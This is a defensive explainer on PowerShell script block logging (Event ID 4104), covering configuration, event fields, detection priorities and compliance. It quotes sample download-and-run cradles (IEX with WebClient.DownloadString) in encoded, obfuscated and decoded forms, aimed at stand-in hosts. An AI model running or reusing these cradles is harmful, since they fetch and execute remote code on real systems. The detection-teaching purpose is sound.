Script block logging captures the full content of PowerShell script blocks as they are executed, including deobfuscated code, dynamically generated commands, and inline expressions. Unlike traditional command-line logging, which only records the initial command string, script block logging records the actual code that the PowerShell engine interprets after all parsing and expansion. This makes it one of the most effective telemetry sources for detecting malicious PowerShell usage, particularly when attackers rely on obfuscation or reflection.

**Key Components of Script Block Logging**

Script block logging is enabled via Group Policy or registry settings under the Windows PowerShell event log channel. The relevant policy path is: Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging. When enabled, it writes events with Event ID 4104 to the Microsoft-Windows-PowerShell/Operational log.

The logging mechanism operates at the engine level. When PowerShell compiles a script block for execution, it logs the fully resolved script text. This includes:
- The original script block source code
- Any code generated by Invoke-Expression, Invoke-Command, or similar cmdlets
- Code produced by string concatenation, variable expansion, or encoding/decoding routines
- Code passed to the -EncodedCommand parameter
- Code executed via the PowerShell pipeline or runspaces

Each 4104 event contains the following critical fields:
- **ScriptBlockText**: The full, deobfuscated script block content
- **ScriptBlockId**: A unique identifier for the script block instance
- **Path**: The file path if the script originated from a file
- **User**: The security identifier of the user executing the script
- **HostApplication**: The executable that launched the PowerShell process (e.g., powershell.exe, powershell_ise.exe, or a custom host)

A companion event, Event ID 4103, logs module and function invocation details, including parameter bindings. This event is less verbose but provides context for which functions were called and with what arguments.

**Real-World Application: Detection and Analysis**

In practice, script block logging is indispensable for incident response and threat hunting. Consider a common attack pattern where an adversary uses Base64-encoded commands to evade detection. Without script block logging, the event log would show only:

```
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==
```

With script block logging enabled, the 4104 event will contain the decoded payload:

```
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
```

This allows the security engineer to immediately identify the network connection and the URL, without needing to manually decode the Base64 string.

Another real-world scenario involves obfuscated PowerShell that uses string splitting, concatenation, or character arithmetic. For example:

```
$c = "IEX"; $a = "(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"; & $c $a
```

Script block logging will log the fully resolved script block as:

```
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')
```

This bypasses the obfuscation and reveals the actual intent.

When analyzing script block logs, security engineers should focus on:
- Script blocks containing Invoke-Expression, Invoke-Command, or Start-Process with suspicious arguments
- Script blocks referencing network download methods (WebClient, HttpClient, or System.Net.Sockets)
- Script blocks that manipulate the Windows registry, services, or scheduled tasks
- Script blocks that decode or decompress data (e.g., FromBase64String, GzipStream)
- Script blocks with high entropy or unusual character distributions, indicating obfuscation

Correlating 4104 events with process creation events (Event ID 4688) and network connection events (Event ID 5156) provides a complete picture of an attack chain.

**Security Relevance**

Script block logging directly addresses a blind spot in traditional security monitoring. Attackers frequently use PowerShell because it is native to Windows, trusted by security tools, and capable of executing arbitrary code in memory without writing to disk. Without script block logging, the only evidence of such activity might be a parent process spawning powershell.exe with a benign-looking command line.

From a compliance perspective, script block logging is required by several frameworks. The Center for Internet Security (CIS) benchmarks for Windows 10 and Windows Server 2019 recommend enabling script block logging. The Australian Signals Directorate’s Essential Eight also includes this control. For organizations subject to PCI DSS, HIPAA, or NIST 800-53, script block logging provides auditable evidence of PowerShell usage, which is critical for demonstrating that administrative actions were authorized and non-malicious.

One important limitation: script block logging does not capture the output of script blocks. It only records the code that was executed. To capture output, you must also enable PowerShell transcription or module logging. Additionally, script block logging can generate a high volume of events in environments with heavy PowerShell usage, so proper log management and retention policies are essential.

Attackers aware of script block logging may attempt to disable it by modifying the registry or Group Policy. Monitoring for changes to the registry key `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` is a recommended detection rule. If the value `EnableScriptBlockLogging` is set to 0 or the key is deleted, this should trigger an alert.

**Key Takeaways**
- Script block logging captures the fully deobfuscated and resolved script block content, making it the primary defense against PowerShell-based attacks that use encoding or obfuscation.
- Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log is the key event to monitor; correlate it with process creation and network events for full attack chain visibility.
- Enable script block logging via Group Policy, monitor for attempts to disable it, and ensure sufficient log storage to handle the event volume in high-usage environments.
